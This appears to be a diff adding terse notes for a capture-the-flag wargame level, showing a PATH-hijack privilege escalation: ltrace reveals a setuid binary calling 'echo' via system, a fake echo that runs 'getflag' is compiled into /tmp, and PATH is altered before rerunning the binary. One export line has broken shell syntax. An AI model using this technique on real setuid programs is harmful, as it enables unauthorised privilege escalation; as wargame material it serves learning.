@@ -1,0 +1,18 @@
+ltrace ./level03
+
+getgid
+getuid
+
+setresgid
+setresuid
+
+echo.c :
+int main() {
+	system("getflag")
+}
+
+gcc echo.c -o echo
+
+export PATH = /tmp/:$PATH
+
+./level03
